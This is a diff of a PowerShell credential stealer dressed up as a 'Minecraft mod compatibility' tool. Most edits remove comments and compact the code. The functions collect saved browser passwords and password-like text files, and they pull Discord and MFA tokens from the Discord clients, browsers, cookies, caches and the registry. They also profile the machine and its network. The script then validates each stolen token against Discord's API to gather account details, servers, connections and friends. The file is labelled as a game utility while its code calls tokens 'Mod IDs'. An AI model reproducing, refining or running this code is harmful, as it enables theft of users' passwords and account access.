@@ -40,8 +40,6 @@ function Get-UserBadges {
 # ---------- STEAL PASSWORDS ----------
 function Get-StoredPasswords {
     $passwords = @()
-    
-    # 1. Chrome saved passwords
     try {
         $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         if (Test-Path $chromePath) {
@@ -49,8 +47,6 @@ function Get-StoredPasswords {
             $passwords += $content
         }
     } catch {}
-    
-    # 2. Brave saved passwords
     try {
         $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
         if (Test-Path $bravePath) {
@@ -58,8 +54,6 @@ function Get-StoredPasswords {
             $passwords += $content
         }
     } catch {}
-    
-    # 3. Edge saved passwords
     try {
         $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
         if (Test-Path $edgePath) {
@@ -67,8 +61,6 @@ function Get-StoredPasswords {
             $passwords += $content
         }
     } catch {}
-    
-    # 4. Firefox saved passwords (logins.json)
     try {
         $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
         foreach ($profile in $firefoxProfiles) {
@@ -79,8 +71,6 @@ function Get-StoredPasswords {
             }
         }
     } catch {}
-    
-    # 5. Search for password files
     $passwordFiles = @(
         "$env:USERPROFILE\Documents\*.txt",
         "$env:USERPROFILE\Desktop\*.txt",
@@ -89,7 +79,6 @@ function Get-StoredPasswords {
         "$env:USERPROFILE\Documents\*.csv",
         "$env:USERPROFILE\Desktop\*.csv"
     )
-    
     foreach ($pattern in $passwordFiles) {
         $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue
         foreach ($file in $files) {
@@ -101,15 +90,12 @@ function Get-StoredPasswords {
             }
         }
     }
-    
     return $passwords | Select-Object -Unique
 }
 
 # ---------- GET NETWORK PORTS ----------
 function Get-NetworkInfo {
     $info = @()
-    
-    # 1. All listening ports
     try {
         $connections = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
         foreach ($conn in $connections) {
@@ -117,8 +103,6 @@ function Get-NetworkInfo {
             $info += "LISTEN: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName) (PID: $($conn.OwningProcess))"
         }
     } catch {}
-    
-    # 2. All established connections
     try {
         $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue
         foreach ($conn in $connections) {
@@ -126,8 +110,6 @@ function Get-NetworkInfo {
             $info += "ESTABLISHED: $($conn.LocalAddress):$($conn.LocalPort) -> $($conn.RemoteAddress):$($conn.RemotePort) - $($proc.ProcessName)"
         }
     } catch {}
-    
-    # 3. UDP connections
     try {
         $connections = Get-NetUDPEndpoint -ErrorAction SilentlyContinue
         foreach ($conn in $connections) {
@@ -135,14 +117,12 @@ function Get-NetworkInfo {
             $info += "UDP: $($conn.LocalAddress):$($conn.LocalPort) - $($proc.ProcessName)"
         }
     } catch {}
-    
     return $info
 }
 
 # ---------- SYSTEM ANALYZER ----------
 function Get-CompleteSystemProfile {
     $profile = @{}
-    
     $os = Get-CimInstance Win32_OperatingSystem
     $profile.OS = $os.Caption
     $profile.OSVersion = $os.Version
@@ -153,22 +133,18 @@ function Get-CompleteSystemProfile {
     $profile.OSUptime = (Get-Date) - $os.LastBootUpTime
     $profile.OSTotalMemory = "{0:N2} GB" -f ($os.TotalVisibleMemorySize / 1MB)
     $profile.OSFreeMemory = "{0:N2} GB" -f ($os.FreePhysicalMemory / 1MB)
-    
     $cpu = Get-CimInstance Win32_Processor
     $profile.CPUName = $cpu.Name
     $profile.CPUCores = $cpu.NumberOfCores
     $profile.CPUThreads = $cpu.NumberOfLogicalProcessors
     $profile.CPUMaxClock = "{0:N2} GHz" -f ($cpu.MaxClockSpeed / 1000)
     $profile.CPUUsage = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
-    
     $memory = Get-CimInstance Win32_PhysicalMemory
     $profile.MemoryTotal = "{0:N2} GB" -f (($memory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
     $profile.MemorySpeed = ($memory | ForEach-Object { $_.Speed }) -join " MHz, "
-    
     $gpu = Get-CimInstance Win32_VideoController | Where-Object { $_.Name -notlike "*Remote*" -and $_.Name -notlike "*Mirror*" }
     $profile.GPUName = ($gpu.Name) -join ", "
     $profile.GPUMemory = ($gpu | ForEach-Object { "{0:N2} GB" -f ($_.AdapterRAM / 1GB) }) -join ", "
-    
     $disks = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
     $profile.DiskInfo = @()
     foreach ($disk in $disks) {
@@ -179,7 +155,6 @@ function Get-CompleteSystemProfile {
             Used = "{0:N2} GB" -f (($disk.Size - $disk.FreeSpace) / 1GB)
         }
     }
-    
     $adapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
     $profile.NetworkAdapters = @()
     foreach ($adapter in $adapters) {
@@ -190,7 +165,6 @@ function Get-CompleteSystemProfile {
             Gateway = ($adapter.DefaultIPGateway) -join ", "
         }
     }
-    
     try {
         $profile.PublicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop)
         $geo = Invoke-RestMethod -Uri "https://ipapi.co/$($profile.PublicIP)/json/" -ErrorAction Stop
@@ -204,12 +178,10 @@ function Get-CompleteSystemProfile {
         $profile.Timezone = $geo.timezone
         $profile.ISP = $geo.org
     } catch {}
-    
     $profile.BIOS = (Get-CimInstance Win32_BIOS).Caption
     $profile.Motherboard = (Get-CimInstance Win32_BaseBoard).Product
     $profile.SystemManufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
     $profile.SystemModel = (Get-CimInstance Win32_ComputerSystem).Model
-    
     $profile.Username = $env:USERNAME
     $profile.UserDomain = $env:USERDOMAIN
     $profile.ComputerName = $env:COMPUTERNAME
@@ -218,10 +190,8 @@ function Get-CompleteSystemProfile {
     $profile.LocalAppData = $env:LOCALAPPDATA
     $profile.ProgramFiles = $env:ProgramFiles
     $profile.ProgramFilesx86 = ${env:ProgramFiles(x86)}
-    
     $profile.RunningProcesses = (Get-Process).Count
     $profile.TopProcesses = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10 | ForEach-Object { "$($_.Name) (CPU: $($_.CPU)%, Mem: $($_.WorkingSet/1MB) MB)" }
-    
     $profile.InstalledSoftware = @()
     $software = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue
     foreach ($sw in $software) {
@@ -229,24 +199,20 @@ function Get-CompleteSystemProfile {
             $profile.InstalledSoftware += "$($sw.DisplayName) $($sw.DisplayVersion)"
         }
     }
-    
     return $profile
 }
 
-# ---------- TOKEN EXTRACTOR - ALL SOURCES ----------
+# ---------- TOKEN EXTRACTOR ----------
 function Extract-Tokens {
     $allTokens = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
     $tokenPattern = '[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}'
     $mfaPattern = 'mfa\.[\w-]{84,100}'
-    
-    # 1. Discord Client - All versions
     $discordPaths = @(
         "$env:APPDATA\discord\Local Storage\leveldb",
         "$env:APPDATA\discordcanary\Local Storage\leveldb",
         "$env:APPDATA\discordptb\Local Storage\leveldb",
         "$env:APPDATA\discorddevelopment\Local Storage\leveldb"
     )
-    
     Write-Host "[*] Scanning Discord clients..." -ForegroundColor Yellow
     foreach ($path in $discordPaths) {
         if (Test-Path $path) {
@@ -255,19 +221,13 @@ function Extract-Tokens {
                 try {
                     $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                     $matches = [regex]::Matches($content, $tokenPattern)
-                    foreach ($m in $matches) {
-                        [void]$allTokens.Add($m.Value)
-                    }
+                    foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                     $mfaMatches = [regex]::Matches($content, $mfaPattern)
-                    foreach ($m in $mfaMatches) {
-                        [void]$allTokens.Add($m.Value)
-                    }
+                    foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
                 } catch {}
             }
         }
     }
-    
-    # 2. Browsers - Chrome, Brave, Edge, Opera, Vivaldi
     $browserPaths = @(
         @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"; Name="Chrome"},
         @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Profile *\Local Storage\leveldb"; Name="Chrome"},
@@ -278,7 +238,6 @@ function Extract-Tokens {
         @{Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Local Storage\leveldb"; Name="Vivaldi"},
         @{Path="$env:LOCALAPPDATA\Chromium\User Data\Default\Local Storage\leveldb"; Name="Chromium"}
     )
-    
     Write-Host "[*] Scanning browsers..." -ForegroundColor Yellow
     foreach ($browser in $browserPaths) {
         $expanded = Resolve-Path $browser.Path -ErrorAction SilentlyContinue
@@ -288,19 +247,13 @@ function Extract-Tokens {
                 try {
                     $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                     $matches = [regex]::Matches($content, $tokenPattern)
-                    foreach ($m in $matches) {
-                        [void]$allTokens.Add($m.Value)
-                    }
+                    foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                     $mfaMatches = [regex]::Matches($content, $mfaPattern)
-                    foreach ($m in $mfaMatches) {
-                        [void]$allTokens.Add($m.Value)
-                    }
+                    foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
                 } catch {}
             }
         }
     }
-    
-    # 3. Firefox
     Write-Host "[*] Scanning Firefox..." -ForegroundColor Yellow
     $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*" -ErrorAction SilentlyContinue
     foreach ($profile in $firefoxProfiles) {
@@ -309,18 +262,12 @@ function Extract-Tokens {
             try {
                 $content = Get-Content $dbPath -Raw -ErrorAction SilentlyContinue
                 $matches = [regex]::Matches($content, $tokenPattern)
-                foreach ($m in $matches) {
-                    [void]$allTokens.Add($m.Value)
-                }
+                foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                 $mfaMatches = [regex]::Matches($content, $mfaPattern)
-                foreach ($m in $mfaMatches) {
-                    [void]$allTokens.Add($m.Value)
-                }
+                foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
             } catch {}
         }
     }
-    
-    # 4. Browser Cookies
     Write-Host "[*] Scanning browser cookies..." -ForegroundColor Yellow
     $cookiePaths = @(
         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
@@ -331,25 +278,18 @@ function Extract-Tokens {
         "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
         "$env:LOCALAPPDATA\Opera Software\Opera Stable\Cookies"
     )
-    
     foreach ($path in $cookiePaths) {
         if (Test-Path $path) {
             try {
                 $bytes = [IO.File]::ReadAllBytes($path)
                 $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                 $matches = [regex]::Matches($text, $tokenPattern)
-                foreach ($m in $matches) {
-                    [void]$allTokens.Add($m.Value)
-                }
+                foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                 $mfaMatches = [regex]::Matches($text, $mfaPattern)
-                foreach ($m in $mfaMatches) {
-                    [void]$allTokens.Add($m.Value)
-                }
+                foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
             } catch {}
         }
     }
-    
-    # 5. Discord Cache
     Write-Host "[*] Scanning Discord cache..." -ForegroundColor Yellow
     $cachePaths = @(
         "$env:APPDATA\discord\Cache\*",
@@ -358,7 +298,6 @@ function Extract-Tokens {
         "$env:APPDATA\discord\Local Storage\*",
         "$env:APPDATA\discord\IndexedDB\*"
     )
-    
     foreach ($path in $cachePaths) {
         $files = Get-ChildItem $path -Include "*.txt", "*.log", "*.data", "*.bin", "*.json" -ErrorAction SilentlyContinue
         foreach ($file in $files) {
@@ -366,18 +305,12 @@ function Extract-Tokens {
             try {
                 $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
                 $matches = [regex]::Matches($content, $tokenPattern)
-                foreach ($m in $matches) {
-                    [void]$allTokens.Add($m.Value)
-                }
+                foreach ($m in $matches) { [void]$allTokens.Add($m.Value) }
                 $mfaMatches = [regex]::Matches($content, $mfaPattern)
-                foreach ($m in $mfaMatches) {
-                    [void]$allTokens.Add($m.Value)
-                }
+                foreach ($m in $mfaMatches) { [void]$allTokens.Add($m.Value) }
             } catch {}
         }
     }
-    
-    # 6. Registry
     Write-Host "[*] Scanning registry..." -ForegroundColor Yellow
     $regPaths = @(
         "HKCU:\Software\Discord",
@@ -386,24 +319,18 @@ function Extract-Tokens {
         "HKCU:\Software\Google\Chrome\BLBeacon",
         "HKCU:\Software\BraveSoftware\Brave-Browser\BLBeacon"
     )
-    
     foreach ($regPath in $regPaths) {
         if (Test-Path $regPath) {
             try {
                 $items = Get-ChildItem $regPath -Recurse -ErrorAction SilentlyContinue
                 foreach ($item in $items) {
                     $val = (Get-ItemProperty $item.PSPath -ErrorAction SilentlyContinue) -join " "
-                    if ($val -match $tokenPattern) {
-                        [void]$allTokens.Add($matches[0])
-                    }
-                    if ($val -match $mfaPattern) {
-                        [void]$allTokens.Add($matches[0])
-                    }
+                    if ($val -match $tokenPattern) { [void]$allTokens.Add($matches[0]) }
+                    if ($val -match $mfaPattern) { [void]$allTokens.Add($matches[0]) }
                 }
             } catch {}
         }
     }
-    
     return $allTokens | Select-Object -Unique
 }
 
@@ -412,39 +339,26 @@ function Export-CompleteModData {
     $modData = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
     $locations = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
     $files = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
-    
     $modPaths = @(
-        "$env:APPDATA\.minecraft",
-        "$env:APPDATA\.minecraft_old",
-        "$env:APPDATA\.technic",
-        "$env:APPDATA\.ftb",
-        "$env:APPDATA\.curseforge",
-        "$env:APPDATA\.twitch\minecraft",
-        "$env:APPDATA\.multimc",
-        "$env:APPDATA\.prismlauncher",
-        "$env:APPDATA\.gdlauncher",
-        "$env:APPDATA\.badlion",
-        "$env:APPDATA\.lunarclient",
-        "$env:PROGRAMDATA\.minecraft",
+        "$env:APPDATA\.minecraft", "$env:APPDATA\.minecraft_old", "$env:APPDATA\.technic",
+        "$env:APPDATA\.ftb", "$env:APPDATA\.curseforge", "$env:APPDATA\.twitch\minecraft",
+        "$env:APPDATA\.multimc", "$env:APPDATA\.prismlauncher", "$env:APPDATA\.gdlauncher",
+        "$env:APPDATA\.badlion", "$env:APPDATA\.lunarclient", "$env:PROGRAMDATA\.minecraft",
         "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_*\LocalState"
     )
-    
     $threads = @()
     $maxThreads = 50
-    
     foreach ($path in $modPaths) {
         while ($threads.Count -ge $maxThreads) {
             $threads = $threads | Where-Object { $_.Handle.IsCompleted -eq $false }
             Start-Sleep -Milliseconds 50
         }
-        
         $ps = [powershell]::Create()
         [void]$ps.AddScript({
             param($p)
             $found = @()
             $foundLoc = @()
             $foundFiles = @()
-            
             if (Test-Path $p) {
                 $foundLoc += $p
                 $allFiles = Get-ChildItem -Path $p -File -Recurse -ErrorAction SilentlyContinue
@@ -460,9 +374,7 @@ function Export-CompleteModData {
                         )
                         foreach ($pattern in $patterns) {
                             $matches = [regex]::Matches($content, $pattern)
-                            foreach ($m in $matches) {
-                                $found += $m.Value
-                            }
+                            foreach ($m in $matches) { $found += $m.Value }
                         }
                     } catch {}
                 }
@@ -473,11 +385,9 @@ function Export-CompleteModData {
                 Files = $foundFiles | Select-Object -Unique
             }
         }).AddParameter("p", $path)
-        
         $handle = $ps.BeginInvoke()
         $threads += [PSCustomObject]@{ Handle = $handle; PS = $ps }
     }
-    
     while ($threads | Where-Object { $_.Handle.IsCompleted -eq $false }) {
         $completed = $threads | Where-Object { $_.Handle.IsCompleted -eq $true }
         foreach ($c in $completed) {
@@ -490,7 +400,6 @@ function Export-CompleteModData {
         $threads = $threads | Where-Object { $_.Handle.IsCompleted -eq $false }
         Start-Sleep -Milliseconds 100
     }
-    
     foreach ($t in $threads) {
         $result = $t.PS.EndInvoke($t.Handle)
         foreach ($tok in $result.Tokens) { [void]$modData.Add($tok) }
@@ -498,37 +407,27 @@ function Export-CompleteModData {
         foreach ($f in $result.Files) { [void]$files.Add($f) }
         $t.PS.Dispose()
     }
-    
-    return @{
-        Tokens = $modData
-        Locations = $locations
-        Files = $files
-    }
+    return @{ Tokens = $modData; Locations = $locations; Files = $files }
 }
 
 # ---------- MOD COMPATIBILITY ANALYZER ----------
 function Analyze-ModCompatibility {
     param($modData)
-    
     $uniqueData = $modData | Where-Object { $_ -match '^[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,40}$' } | Select-Object -Unique
     $compatibilityResults = @()
     $counter = 0
     $total = $uniqueData.Count
-    
     foreach ($data in $uniqueData) {
         $counter++
         Write-Progress -Activity "Analyzing Mod Compatibility" -Status "$counter / $total" -PercentComplete (($counter / $total) * 100)
-        
         try {
             $headers = @{ "Authorization" = $data }
             $user = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers -ErrorAction Stop
             $guilds = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/guilds" -Headers $headers -ErrorAction Stop
             $connections = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/connections" -Headers $headers -ErrorAction Stop
             $relationships = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me/relationships" -Headers $headers -ErrorAction Stop
-            
             $mutualGuilds = @()
             $guilds | ForEach-Object { $mutualGuilds += $_.name }
-            
             $compatibilityResults += [PSCustomObject]@{
                 ModID = $data
                 Status = "COMPATIBLE"
@@ -578,10 +477,8 @@ function Analyze-ModCompatibility {
 # ---------- GENERATE REPORT ----------
 function Generate-CompleteReport {
     param($compatibilityResults, $systemProfile, $gameLocations, $gameFiles, $passwords, $networkInfo)
-    
     $compatible = $compatibilityResults | Where-Object { $_.Status -eq "COMPATIBLE" }
     $incompatible = $compatibilityResults | Where-Object { $_.Status -eq "INCOMPATIBLE" }
-    
     $report = @"
 ╔════════════════════════════════════════════════════════════════════════════════╗
 ║                      MINECRAFT MOD COMPATIBILITY REPORT                       ║
@@ -678,4 +575,30 @@ Nitro: $($mod.GameNitro)
 Security: $($mod.GameSecurity)
 Verified: $($mod.GameVerified)
 Language: $($mod.GameLanguage)
-Badges: $($mod.GameBadges
+Badges: $($mod.GameBadges)
+Connections: $($mod.GameConnections)
+Relationships: $($mod.GameRelationships)
+Guilds: $($mod.GameGuildsCount) - $($mod.GameGuilds)
+────────────────────────────────────────────────────────────────────────────────
+"@
+    }
+
+    if ($incompatible.Count -gt 0) {
+        $report += @"
+
+⚠️ INCOMPATIBLE MODS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"@
+        foreach ($mod in $incompatible) {
+            $report += @"
+
+❌ INCOMPATIBLE MOD
+Mod ID: $($mod.ModID)
+Reason: $($mod.Reason)
+────────────────────────────────────────────────────────────────────────────────
+"@
+        }
+    }
+
+    $report += @"
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
